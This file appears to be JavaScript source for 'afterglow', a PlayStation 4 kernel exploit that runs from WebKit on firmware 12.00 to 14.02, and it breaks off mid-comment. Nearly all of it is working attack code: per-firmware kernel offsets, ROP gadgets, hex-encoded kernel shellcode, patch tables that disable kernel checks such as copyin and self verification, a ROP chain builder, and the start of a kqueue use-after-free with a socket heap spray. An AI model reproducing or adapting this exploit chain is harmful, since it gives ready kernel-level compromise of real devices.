/*
    afterglow -- PlayStation 4 kernel exploit for firmware 14.00
    Port to the raw13 host (WebKit entry), from the Lua original.

    Copyright (C) 2026 well0nez

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as
    published by the Free Software Foundation, either version 3 of the
    License, or (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.

    Ported from the Lua original, which ran inside a game process. This
    file runs from WebKit, where the heap is groomed by someone else and the
    page can go away mid-chain -- see the handle teardown at the bottom.
    probeAfterglow() answers whether a given process can carry the exploit
    at all; it fires nothing and patches nothing.

    What the host must provide, and raw13 does:
      sc(num, ...args)      syscall, returns {lo, hi, i32}
      bufAddr(arrayBuffer)  int64 address of the backing store
      p.read1/4/8           read in this process
      p.write1/4/8          write in this process
      p.readInto(u8, at, n)
      keepAlive             array, so our buffers survive the collector
      mark(tag, detail)     log
    A way to call native code is NOT needed.
*/

import { int64 } from "./int64.js";

const S = {
  open: 5, close: 6, ioctl: 54, mprotect: 74, socket: 97, setsockopt: 105,
  getuid: 24, kqueue: 362, kevent: 363, mmap: 477, thr_self: 432,
  getpid: 20, sysctl: 202, cpuset_getaffinity: 487,
  cpuset_setaffinity: 488, dynlib_get_list: 592, dynlib_get_info: 593,
};

/* Offsets into the kernel image, one table per firmware. Everything that
   moved between 13.52 and 14.00 lives here; everything that did not is
   written once. The 13.52 column was derived from the two kernel images
   offline and cross-checked against a second method per value. */
const FIRMWARE = {
  "14.00": {
    anchor:    0x00e6c60,   /* the lock the leak hands us */
    swap_rbp:  0x0a80f68,   /* xchg rbp,rax ; ret */
    prison0:   0x111fa18,   /* holds a pointer to prison0, so read it */
    rootvnode: 0x2136e90,
    padding:   0x0b39d98,   /* start of the zero run behind kernel text */
    ghKmem:    0x0466540,
  },
  "13.52": {
    anchor:    0x00e6c60,   /* same function, same place */
    swap_rbp:  0x0a80c98,   /* 4e 95 c3, the only match in text */
    prison0:   0x111fa18,   /* same, decoded from the same instruction */
    rootvnode: 0x2136e90,
    padding:   0x0b39ad8,
    ghKmem:    0x0466290,
  },

  /* 13.00 through 13.50 are confirmed on hardware. */
  "13.00": {
    anchor:    0x00e6c20,
    swap_rbp:  0x0a803c8,
    prison0:   0x111fa18,
    rootvnode: 0x2136e90,
    padding:   0x0b39218,
    ghKmem:    0x0465a40,
  },
  "13.02": {
    anchor:    0x00e6c20,
    swap_rbp:  0x0a803c8,
    prison0:   0x111fa18,
    rootvnode: 0x2136e90,
    padding:   0x0b39218,
    ghKmem:    0x0465a50,
  },
  "13.04": {
    anchor:    0x00e6c20,
    swap_rbp:  0x0a803c8,
    prison0:   0x111fa18,
    rootvnode: 0x2136e90,
    padding:   0x0b39218,
    ghKmem:    0x0465a50,
  },
  "13.50": {
    anchor:    0x00e6c20,
    swap_rbp:  0x0a80838,
    prison0:   0x111fa18,
    rootvnode: 0x2136e90,
    padding:   0x0b39658,
    ghKmem:    0x0465e90,
  },
  "14.02": {
    anchor:    0x00e6c30,   /* -0x30 from 14.00 -- the one that moves backwards */
    swap_rbp:  0x0a81478,
    prison0:   0x111fa18,
    rootvnode: 0x2136e90,
    padding:   0x0b3a298,
    ghKmem:    0x0466920,
  },
  "12.00": {
    anchor:    0x00e6c20,
    swap_rbp:  0x0a80188,
    prison0:   0x111fa18,
    rootvnode: 0x2136e90,
    padding:   0x0b38fd8,
    ghKmem:    0x04659e0,
  },
  "12.02": {
    anchor:    0x00e6c20,
    swap_rbp:  0x0a80188,
    prison0:   0x111fa18,
    rootvnode: 0x2136e90,
    padding:   0x0b38fd8,
    ghKmem:    0x04659e0,
  },
  "12.50": {
    anchor:    0x00e6c20,
    swap_rbp:  0x0a80248,
    prison0:   0x111fa18,
    rootvnode: 0x2136e90,
    padding:   0x0b39098,
    ghKmem:    0x0465a20,
  },
  "12.52": {
    anchor:    0x00e6c20,
    swap_rbp:  0x0a80248,
    prison0:   0x111fa18,
    rootvnode: 0x2136e90,
    padding:   0x0b39098,
    ghKmem:    0x0465a20,
  },
};

let K = null;

/* offsets into libSceLibcInternal, with the bytes that must be found there */
const GADGETS = {
  pivot:  [0x0d2812, "488b67385fc3"],   /* mov rsp,[rdi+0x38] ; pop rdi ; ret */
  rdi:    [0x0a6bae, "5fc3"],
  rsi:    [0x095560, "5ec3"],
  rdx:    [0x04e6d2, "5ac3"],
  rcx:    [0x0943ee, "59c3"],
  store:  [0x041ceb, "488907c3"],       /* mov [rdi],rax ; ret */
  load:   [0x0120b1, "488b07c3"],       /* mov rax,[rdi] ; ret */
  load8:  [0x057fae, "488b4008c3"],     /* mov rax,[rax+8] ; ret */
  add:    [0x0aaf8b, "4801f8c3"],
  sub:    [0x0275b4, "4829f8c3"],
  shr:    [0x0a9ba2, "48d3e8c3"],
  shl:    [0x0a9b98, "48d3e0c3"],
  memcpy: [0x026ad0, "554889e54889f8"],
  leave:  [0x09e59d, "c9c3"],
};

/* the read only tail of the libc text segment: executable already, claimed by
   no ELF header. An anonymous page stays non executable on this firmware
   however the mapping is widened, which is why this room is used at all. */
const HOST = { page: 0x130000, free: 0x130730, last: 0x131000 };

const TUNE = {
  sprays: 126,   /* a hard floor, one short of it never lands */
  object: 104,   /* sprayed object, falls into the 128 byte zone */
  window: 0x4000,
  entries: 420,
  stride: 0x90,
  seed: 45,
  spare: 8,
  batch: 60,     /* setsockopt per rop entry */
  ceiling: 63,   /* how far up to look for a free unit */
};

/* any cdev will do: the exploit only needs a file whose operation table sits
   in kernel text. Deliberately not a socket -- the spray needs all 126 of
   those, and one short of that never lands in the right bucket. */
const PROBE_NODES = ["/dev/rng", "/dev/urandom", "/dev/random", "/dev/zero", "/dev/null"];

/* The bootstrap carries its kernel addresses inside the machine code, so it
   is one blob per firmware. Between 13.52 and 14.00 exactly two of its ten
   write targets moved -- the two 0x33 -> 0x37 immediates. */
const BOOTSTRAP_TABLE = {
  "14.00":
      "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
    + "488991882d1001c781ac2d100101000000c681daaa1f0037c681ddaa1f00370f"
    + "20c0480d000001000f22c031c0c3",
  "13.52":
      "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
    + "488991882d1001c781ac2d100101000000c6813aa81f0037c6813da81f00370f"
    + "20c0480d000001000f22c031c0c3",
  "13.00":
    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
    + "488991882d1001c781ac2d100101000000c6817aa71f0037c6817da71f00370f"
    + "20c0480d000001000f22c031c0c3",
  "13.02":
    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
    + "488991882d1001c781ac2d100101000000c6818aa71f0037c6818da71f00370f"
    + "20c0480d000001000f22c031c0c3",
  "13.04":
    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
    + "488991882d1001c781ac2d100101000000c6818aa71f0037c6818da71f00370f"
    + "20c0480d000001000f22c031c0c3",
  "13.50":
    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
    + "488991882d1001c781ac2d100101000000c6819aa71f0037c6819da71f00370f"
    + "20c0480d000001000f22c031c0c3",
  "14.02":
    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
    + "488991882d1001c781ac2d100101000000c681daae1f0037c681ddae1f00370f"
    + "20c0480d000001000f22c031c0c3",
  "12.00":
    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
    + "488991882d1001c781ac2d100101000000c6811aa71f0037c6811da71f00370f"
    + "20c0480d000001000f22c031c0c3",
  "12.02":
    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
    + "488991882d1001c781ac2d100101000000c6811aa71f0037c6811da71f00370f"
    + "20c0480d000001000f22c031c0c3",
  "12.50":
    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
    + "488991882d1001c781ac2d100101000000c6815aa71f0037c6815da71f00370f"
    + "20c0480d000001000f22c031c0c3",
  "12.52":
    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
    + "488991882d1001c781ac2d100101000000c6815aa71f0037c6815da71f00370f"
    + "20c0480d000001000f22c031c0c3",
};

let BOOTSTRAP = null;

/* Pick the tables for a firmware. Returns false for one we have no kernel
   stage for -- the caller must not go on, because every address below is
   then simply wrong. */
let FW_KEY = "";

function setFirmware(fw) {
  const f = FIRMWARE[fw];
  if (!f || !PATCH_TABLE[fw] || !BOOTSTRAP_TABLE[fw]) return false;
  K = f;
  PADDING = f.padding;
  PATCHES = PATCH_TABLE[fw];
  BOOTSTRAP = BOOTSTRAP_TABLE[fw];
  GH.rvaKmem = f.ghKmem;
  FW_KEY = fw;
  return true;
}

const PATCH_TABLE = {
  "14.00": [
  [0x0000acd, "eb",       "bcopy"],
  [0x02bd79d, "eb",       "bzero"],
  [0x02bd7e1, "eb",       "pagezero"],
  [0x02bd85d, "eb",       "memcpy"],
  [0x02bd8a1, "eb",       "pagecopy"],
  [0x02bda4d, "eb",       "copyin"],
  [0x02bdefd, "eb",       "copyinstr"],
  [0x02bdfcd, "eb",       "copystr"],
  [0x01b7a43, "eb04",     "dlsym, first check"],
  [0x01b7a53, "eb04",     "dlsym, second check"],
  [0x01b7a73, "90e9",     "dlsym, nop and jump"],
  [0x01b7504, "90e9",     "load_prx"],
  [0x01b7ab8, "90e93c01", "dlsym, open it to every caller"],
  [0x0628684, "eb00",     "self verification"],
  [0x0628f6f, "eb00",     "delayed panic on suspend"],
  ],
  "13.52": [
  [0x0000acd, "eb",       "bcopy"],
  [0x02bd4ed, "eb",       "bzero"],
  [0x02bd531, "eb",       "pagezero"],
  [0x02bd5ad, "eb",       "memcpy"],
  [0x02bd5f1, "eb",       "pagecopy"],
  [0x02bd79d, "eb",       "copyin"],
  [0x02bdc4d, "eb",       "copyinstr"],
  [0x02bdd1d, "eb",       "copystr"],
  [0x01b77a3, "eb04",     "dlsym, first check"],
  [0x01b77b3, "eb04",     "dlsym, second check"],
  [0x01b77d3, "90e9",     "dlsym, nop and jump"],
  [0x01b7264, "90e9",     "load_prx"],
  [0x01b7818, "90e93c01", "dlsym, open it to every caller"],
  [0x06283c4, "eb00",     "self verification"],
  [0x0628caf, "eb00",     "delayed panic on suspend"],
  ],
  "13.00": [
  [0x0000acd, "eb",        "bcopy"],
  [0x02bd42d, "eb",        "bzero"],
  [0x02bd471, "eb",        "pagezero"],
  [0x02bd4ed, "eb",        "memcpy"],
  [0x02bd531, "eb",        "pagecopy"],
  [0x02bd6dd, "eb",        "copyin"],
  [0x02bdb8d, "eb",        "copyinstr"],
  [0x02bdc5d, "eb",        "copystr"],
  [0x01b76e3, "eb04",      "dlsym, first check"],
  [0x01b76f3, "eb04",      "dlsym, second check"],
  [0x01b7713, "90e9",      "dlsym, nop and jump"],
  [0x01b71a4, "90e9",      "load_prx"],
  [0x01b7758, "90e93c01",  "dlsym, open it to every caller"],
  [0x0627b84, "eb00",      "self verification"],
  [0x062846f, "eb00",      "delayed panic on suspend"],
  ],
  "13.02": [
  [0x0000acd, "eb",        "bcopy"],
  [0x02bd43d, "eb",        "bzero"],
  [0x02bd481, "eb",        "pagezero"],
  [0x02bd4fd, "eb",        "memcpy"],
  [0x02bd541, "eb",        "pagecopy"],
  [0x02bd6ed, "eb",        "copyin"],
  [0x02bdb9d, "eb",        "copyinstr"],
  [0x02bdc6d, "eb",        "copystr"],
  [0x01b76f3, "eb04",      "dlsym, first check"],
  [0x01b7703, "eb04",      "dlsym, second check"],
  [0x01b7723, "90e9",      "dlsym, nop and jump"],
  [0x01b71b4, "90e9",      "load_prx"],
  [0x01b7768, "90e93c01",  "dlsym, open it to every caller"],
  [0x0627b84, "eb00",      "self verification"],
  [0x062846f, "eb00",      "delayed panic on suspend"],
  ],
  "13.04": [
  [0x0000acd, "eb",        "bcopy"],
  [0x02bd43d, "eb",        "bzero"],
  [0x02bd481, "eb",        "pagezero"],
  [0x02bd4fd, "eb",        "memcpy"],
  [0x02bd541, "eb",        "pagecopy"],
  [0x02bd6ed, "eb",        "copyin"],
  [0x02bdb9d, "eb",        "copyinstr"],
  [0x02bdc6d, "eb",        "copystr"],
  [0x01b76f3, "eb04",      "dlsym, first check"],
  [0x01b7703, "eb04",      "dlsym, second check"],
  [0x01b7723, "90e9",      "dlsym, nop and jump"],
  [0x01b71b4, "90e9",      "load_prx"],
  [0x01b7768, "90e93c01",  "dlsym, open it to every caller"],
  [0x0627b84, "eb00",      "self verification"],
  [0x062846f, "eb00",      "delayed panic on suspend"],
  ],
  "13.50": [
  [0x0000acd, "eb",        "bcopy"],
  [0x02bd44d, "eb",        "bzero"],
  [0x02bd491, "eb",        "pagezero"],
  [0x02bd50d, "eb",        "memcpy"],
  [0x02bd551, "eb",        "pagecopy"],
  [0x02bd6fd, "eb",        "copyin"],
  [0x02bdbad, "eb",        "copyinstr"],
  [0x02bdc7d, "eb",        "copystr"],
  [0x01b7703, "eb04",      "dlsym, first check"],
  [0x01b7713, "eb04",      "dlsym, second check"],
  [0x01b7733, "90e9",      "dlsym, nop and jump"],
  [0x01b71c4, "90e9",      "load_prx"],
  [0x01b7778, "90e93c01",  "dlsym, open it to every caller"],
  [0x0627fc4, "eb00",      "self verification"],
  [0x06288af, "eb00",      "delayed panic on suspend"],
  ],
  "14.02": [
  [0x0000acd, "eb",        "bcopy"],
  [0x02bda9d, "eb",        "bzero"],
  [0x02bdae1, "eb",        "pagezero"],
  [0x02bdb5d, "eb",        "memcpy"],
  [0x02bdba1, "eb",        "pagecopy"],
  [0x02bdd4d, "eb",        "copyin"],
  [0x02be1fd, "eb",        "copyinstr"],
  [0x02be2cd, "eb",        "copystr"],
  [0x01b7c63, "eb04",      "dlsym, first check"],
  [0x01b7c73, "eb04",      "dlsym, second check"],
  [0x01b7c93, "90e9",      "dlsym, nop and jump"],
  [0x01b7724, "90e9",      "load_prx"],
  [0x01b7cd8, "90e93c01",  "dlsym, open it to every caller"],
  [0x0628b04, "eb00",      "self verification"],
  [0x06293ef, "eb00",      "delayed panic on suspend"],
  ],
  "12.00": [
  [0x0000acd, "eb",        "bcopy"],
  [0x02bd3cd, "eb",        "bzero"],
  [0x02bd411, "eb",        "pagezero"],
  [0x02bd48d, "eb",        "memcpy"],
  [0x02bd4d1, "eb",        "pagecopy"],
  [0x02bd67d, "eb",        "copyin"],
  [0x02bdb2d, "eb",        "copyinstr"],
  [0x02bdbfd, "eb",        "copystr"],
  [0x01b76a3, "eb04",      "dlsym, first check"],
  [0x01b76b3, "eb04",      "dlsym, second check"],
  [0x01b76d3, "90e9",      "dlsym, nop and jump"],
  [0x01b7164, "90e9",      "load_prx"],
  [0x01b7718, "90e93c01",  "dlsym, open it to every caller"],
  [0x0627af4, "eb00",      "self verification"],
  [0x06283df, "eb00",      "delayed panic on suspend"],
  ],
  "12.02": [
  [0x0000acd, "eb",        "bcopy"],
  [0x02bd3cd, "eb",        "bzero"],
  [0x02bd411, "eb",        "pagezero"],
  [0x02bd48d, "eb",        "memcpy"],
  [0x02bd4d1, "eb",        "pagecopy"],
  [0x02bd67d, "eb",        "copyin"],
  [0x02bdb2d, "eb",        "copyinstr"],
  [0x02bdbfd, "eb",        "copystr"],
  [0x01b76a3, "eb04",      "dlsym, first check"],
  [0x01b76b3, "eb04",      "dlsym, second check"],
  [0x01b76d3, "90e9",      "dlsym, nop and jump"],
  [0x01b7164, "90e9",      "load_prx"],
  [0x01b7718, "90e93c01",  "dlsym, open it to every caller"],
  [0x0627af4, "eb00",      "self verification"],
  [0x06283df, "eb00",      "delayed panic on suspend"],
  ],
  "12.50": [
  [0x0000acd, "eb",        "bcopy"],
  [0x02bd40d, "eb",        "bzero"],
  [0x02bd451, "eb",        "pagezero"],
  [0x02bd4cd, "eb",        "memcpy"],
  [0x02bd511, "eb",        "pagecopy"],
  [0x02bd6bd, "eb",        "copyin"],
  [0x02bdb6d, "eb",        "copyinstr"],
  [0x02bdc3d, "eb",        "copystr"],
  [0x01b76e3, "eb04",      "dlsym, first check"],
  [0x01b76f3, "eb04",      "dlsym, second check"],
  [0x01b7713, "90e9",      "dlsym, nop and jump"],
  [0x01b71a4, "90e9",      "load_prx"],
  [0x01b7758, "90e93c01",  "dlsym, open it to every caller"],
  [0x0627b34, "eb00",      "self verification"],
  [0x062841f, "eb00",      "delayed panic on suspend"],
  ],
  "12.52": [
  [0x0000acd, "eb",        "bcopy"],
  [0x02bd40d, "eb",        "bzero"],
  [0x02bd451, "eb",        "pagezero"],
  [0x02bd4cd, "eb",        "memcpy"],
  [0x02bd511, "eb",        "pagecopy"],
  [0x02bd6bd, "eb",        "copyin"],
  [0x02bdb6d, "eb",        "copyinstr"],
  [0x02bdc3d, "eb",        "copystr"],
  [0x01b76e3, "eb04",      "dlsym, first check"],
  [0x01b76f3, "eb04",      "dlsym, second check"],
  [0x01b7713, "90e9",      "dlsym, nop and jump"],
  [0x01b71a4, "90e9",      "load_prx"],
  [0x01b7758, "90e93c01",  "dlsym, open it to every caller"],
  [0x0627b34, "eb00",      "self verification"],
  [0x062841f, "eb00",      "delayed panic on suspend"],
  ],
};

let PATCHES = null;

/* ------------------------------------------------------------- the host */

const STATE = { ctx: null, units: {}, clones: 0, base: null, stubs: {}, batch: undefined, retry: false };

function host() {
  if (!STATE.ctx) throw new Error("afterglow: no host installed");
  return STATE.ctx;
}

function say(fmt) { host().mark("AG", fmt); }

const LOW = 0x100000000;

function v(low, hi) { return new int64(low >>> 0, (hi || 0) >>> 0); }
function plus(a, n) { return n < 0 ? a.sub32(-n) : a.add32(n); }
function same(a, b) { return !!b && a.low === b.low && a.hi === b.hi; }
function inText(a) { return a.hi >= 0xffffff00 && a.low !== 0; }
function inHeap(a) { return a.hi >= 0xffff0000 && a.hi < 0xffffff00 && a.low !== 0; }
function text(a) { return "0x" + a.toString(16).padStart(16, "0"); }

/* The host resolves a syscall number to a libkernel stub and only ever
   scanned for its own two dozen. Ours -- open, mprotect, kqueue, kevent,
   ioctl, the dynlib pair -- are not among them, and an unresolved number
   reaches its argument marshalling as undefined. So we scan for the rest
   ourselves, with the same shape it looks for:

       48 c7 c0 <nr32>   49 89 ca   0f 05

   One pass for everything missing, not one pass per number. */
function seedStubs() {
  const c = host();
  const need = new Set();
  for (const k in S) {
    const n = S[k];
    if (!(c.stubAddr && c.stubAddr.has(n)) && !STATE.stubs[n]) need.add(n);
  }
  if (!need.size) return [];

  const base = c.libkernelBase;
  if (!base) return Array.from(need);

  const limit = (c.off && c.off.k_scan_stage1) || 0x200000;
  for (let o = 0; o < limit && need.size; o += 16) {
    const q = c.p.read8(base.add32(o));
    if ((q.low & 0x00ffffff) !== 0xc0c748 || (q.hi >>> 24) !== 0x49) continue;
    const n = ((q.low >>> 24) | ((q.hi & 0x00ffffff) << 8)) >>> 0;
    if (!need.has(n)) continue;
    STATE.stubs[n] = base.add32(o);
    need.delete(n);
  }
  return Array.from(need);
}

function stubFor(num) {
  const c = host();
  if (STATE.stubs[num]) return STATE.stubs[num];
  if (c.stubAddr && c.stubAddr.has(num)) return c.stubAddr.get(num);
  return null;
}

function sc(num) {
  const a = Array.prototype.slice.call(arguments, 1);
  const t = stubFor(num);
  if (!t) throw new Error("afterglow: no libkernel stub for syscall " + num);
  return host().callAddr(t, a);
}

function alloc(size) {
  const c = host();
  const ab = new ArrayBuffer(size);
  const u8 = new Uint8Array(ab);
  const dv = new DataView(ab);
  c.keepAlive.push(ab, u8, dv);
  return { ab: ab, u8: u8, dv: dv, at: c.bufAddr(ab) };
}

function rd4(at) { return host().p.read4(at) >>> 0; }
function rd8(at) { const r = host().p.read8(at); return v(r.low, r.hi); }
function wr1(at, b) { host().p.write1(at, b & 0xff); }
function wr4(at, n) { host().p.write4(at, n >>> 0); }
function wr8(at, q) { host().p.write8(at, q); }

/* p carries read1/2/4/8 and write1/2/4/8 and nothing bulk, so this walks it
   a quadword at a time and picks up the remainder by byte. */
function rdbuf(at, len) {
  const out = new Uint8Array(len);
  const pr = host().p;
  let i = 0;
  while (i + 8 <= len) {
    const q = pr.read8(plus(at, i));
    let lo = q.low >>> 0, hi = q.hi >>> 0;
    for (let k = 0; k < 4; k++) { out[i + k] = lo & 0xff; lo = lo >>> 8; }
    for (let k = 0; k < 4; k++) { out[i + 4 + k] = hi & 0xff; hi = hi >>> 8; }
    i += 8;
  }
  while (i < len) { out[i] = pr.read1(plus(at, i)) & 0xff; i++; }
  return out;
}

function wrbuf(at, bytes) {
  for (let i = 0; i < bytes.length; i++) wr1(plus(at, i), bytes[i]);
}

function unhex(s) {
  const out = new Uint8Array(s.length / 2);
  for (let i = 0; i < out.length; i++) out[i] = parseInt(s.substr(i * 2, 2), 16);
  return out;
}

function sameBytes(a, b) {
  if (a.length !== b.length) return false;
  for (let i = 0; i < a.length; i++) if (a[i] !== b[i]) return false;
  return true;
}

/* 64 bit quantity into a buffer, and back */
function pokeAt(buf, off, q) {
  buf.dv.setUint32(off, q.low >>> 0, true);
  buf.dv.setUint32(off + 4, q.hi >>> 0, true);
}


function wipe(buf, len) { buf.u8.fill(0, 0, len); }

function cstr(s) {
  const b = alloc(s.length + 8);
  for (let i = 0; i < s.length; i++) b.u8[i] = s.charCodeAt(i);
  b.u8[s.length] = 0;
  return b;
}

function splitNum(n) { return v(n % LOW, Math.floor(n / LOW)); }
function asQ(x) { return (typeof x === "number") ? splitNum(x) : x; }

/* ------------------------------------------------- machine code pad */

function codeAt(pageAt, off) {
  return {
    at: plus(pageAt, off),
    n: 0,
    reset: function () { this.n = 0; return this; },
    byte: function (b) { wr1(plus(this.at, this.n), b); this.n++; return this; },
    hex: function (s) {
      const b = unhex(s);
      for (let i = 0; i < b.length; i++) this.byte(b[i]);
      return this;
    },
    dw: function (n) {
      for (let k = 0; k < 4; k++) this.byte(Math.floor(n / Math.pow(256, k)) % 256);
      return this;
    },
    qw: function (q) { return this.dw(q.low >>> 0).dw(q.hi >>> 0); },
    imm: function (bytes) {
      for (let i = 0; i < bytes.length; i++) this.byte(bytes[i]);
      return this;
    },
  };
}

/* ------------------------------------------------------- rop chain */

function makeChain(buf, gad) {
  return {
    buf: buf, base: buf.at, n: 0, fix: [], g: gad,

    slot: function (q) { pokeAt(this.buf, this.n * 8, asQ(q)); this.n++; return this.n - 1; },
    num: function (n) { return this.slot(asQ(n)); },
    hole: function () { return this.slot(v(0, 0)); },
    where: function (i) { return plus(this.base, i * 8); },
    gad: function (name) { return this.slot(this.g[name]); },
    point: function (hole, target) { this.fix.push([hole, target]); },

    seal: function () {
      for (let i = 0; i < this.fix.length; i++) {
        pokeAt(this.buf, this.fix[i][0] * 8, this.where(this.fix[i][1]));
      }
      this.gad("leave");
    },

    rdi: function (n) { this.gad("rdi"); return this.num(n); },
    rsi: function (n) { this.gad("rsi"); return this.num(n); },
    rdx: function (n) { this.gad("rdx"); return this.num(n); },

    /* rax <- *(rax + off), through the one deref gadget there is */
    follow: function (off) {
      const d = off - 8;
      if (d >= 0) { this.rdi(d); this.gad("add"); } else { this.rdi(-d); this.gad("sub"); }
      this.gad("load8");
    },

    save_rax: function (at) { this.rdi(at); this.gad("store"); },
    load_rax: function (at) { this.rdi(at); this.gad("load"); },

    /* copy len bytes from wherever rax points to dst, and report the slot
       that ends up holding the source address */
    grab: function (dst, len) {
      this.gad("rdi"); const h = this.hole();
      this.gad("store");
      this.gad("rsi"); const s = this.hole();
      this.point(h, s);
      this.rdx(len); this.rdi(dst); this.gad("memcpy");
      return s;
    },

    put: function (dst, src, len) {
      this.gad("rdi"); this.slot(dst);
      this.rsi(src); this.rdx(len); this.gad("memcpy");
    },
  };
}

/* ----------------------------------------------------------- a shot */

/* One attempt at the bug. Each takes a unit nobody used before: a unit an
   earlier attempt touched still carries a note from that attempt's queue, and
   freeing its clone again would leave a foreign queue pointing at dead
   memory. */
function shooter(gad) {
  const s = {
    g: gad, fired: 0, sprayed: 0, devs: [], queues: [],
    sockaddr: alloc(16),
  };
  const bs = [16, 2, 0x04, 0xD2, 0x0a, 0, 0, 1];
  for (let i = 0; i < bs.length; i++) s.sockaddr.u8[i] = bs[i];

  s.hold = function (path) {
    const fd = sc(S.open, cstr(path).at, 0).i32;
    if (fd >= 0) this.devs.push(fd);
    return fd;
  };

  s.take = function (build, room) {
    /* four ways to come back empty, and telling them apart matters: one is a
       spent budget, one is a refused open, one is a kernel that would not
       arm. A bare null names none of them. */
    this.why = null;
    if (this.hold("/dev/apm") < 0) {
      this.why = "the clone node refused to open, errno " + host().errno();
      return null;
    }

    /* The ceiling used to be 15. By the second shot this process is
       already holding some fifty clones of its own, so the free numbers sit
       above that -- and a search that stops at fifteen finds nothing while
       reporting "no unused unit", which is true and useless. Look further,
       and write down why the refusals came. */
    let unit = -1, watched = -1;
    const refused = [];
    for (let u = TUNE.ceiling; u >= 0; u--) {
      if (STATE.units[u]) continue;
      const fd = this.hold("/dev/apm" + u);
      if (fd >= 0) { unit = u; watched = fd; break; }
      if (refused.length < 4) refused.push(u + ":e" + host().errno());
    }
    if (unit < 0) {
      this.why = "no apm unit among 0.." + TUNE.ceiling
                 + " (" + Object.keys(STATE.units).length + " spent, refusals "
                 + refused.join(" ") + ")";
      return null;
    }
    STATE.units[unit] = true;
    this.fired++;

    const doomed = sc(S.open, cstr("/dev/apm" + unit).at, 0).i32;
    if (doomed < 0) {
      this.why = "second open of /dev/apm" + unit + " refused, errno " + host().errno();
      return null;
    }

    const q = sc(S.kqueue).i32;
    this.queues.push(q);
    const ev = alloc(32);
    const arm = function () {
      ev.dv.setUint32(0, watched >>> 0, true);
      ev.dv.setUint32(4, 0, true);
      ev.dv.setUint16(8, 0xFFFF, true);
      ev.dv.setUint16(10, 0x0001, true);
      ev.dv.setUint32(12, 0, true);
      ev.u8.fill(0, 16, 32);
      return sc(S.kevent, q, ev.at, 1, 0, 0, 0).i32;
    };
    const armed = arm();
    if (armed !== 0) {
      this.why = "kevent would not arm on unit " + unit + ", rv=" + armed
                 + " errno " + host().errno();
      return null;
    }

    /* Everything that is not a 128 byte allocation happens before the free.
       Anything in between lets a foreign consumer take the hole first. */
    const rop = alloc(room || 0x400);
    const frame = alloc(0x100);
    wipe(frame, 0x100);
    const c = makeChain(rop, this.g);
    c.num(0);                      /* swallowed by the pop in the pivot gadget */
    build(c);
    c.seal();
    pokeAt(frame, 0x38, rop.at);

    const body = alloc(TUNE.object);
    wipe(body, TUNE.object);
    pokeAt(body, 0x38, this.g.pivot);
    pokeAt(body, 0x58, frame.at);

    const req = alloc(40);
    req.dv.setUint32(0, 1, true);
    req.dv.setUint32(4, 0, true);
    pokeAt(req, 8, this.sockaddr.at);
    req.dv.setUint32(16, 16, true);
    pokeAt(req, 24, body.at);
    req.dv.setUint32(32, TUNE.object, true);

    /* The original tapered this to TUNE.spare once sixty clones were out --
       a saving that suits a quiet game process. Here the three failures that
       reached this far all sat on a shot that had seeded eight. Seeding
       happens before the free, so it costs nothing in the window that
       decides the outcome. */
    const want = TUNE.seed;
    for (let i = 0; i < want; i++) {
      if (this.hold("/dev/apm") < 0) break;
      STATE.clones++;
    }

    const socks = [];
    for (let i = 0; i < TUNE.sprays; i++) {
      const fd = sc(S.socket, 2, 2, 0).i32;
      if (fd < 0) break;
      socks.push(fd);
    }

    /* The window: from the free to the last spray. In the Lua host each of
       these is a cheap syscall; here every one is a ROP call -- lay out a
       stack, bend a pivot cell, trip Math.expm1, put the cell back. Nothing
       may be printed inside it, so the number is only reported afterwards. */
    const hh = host();
    const stub = stubFor(S.setsockopt);
    /* One entry per batch instead of one per socket. One entry per socket
       was measured at 119 us, so 126 of them held the hole open for 15 ms;
       batched it is 0 to 1 ms, which is where the Lua host already was.
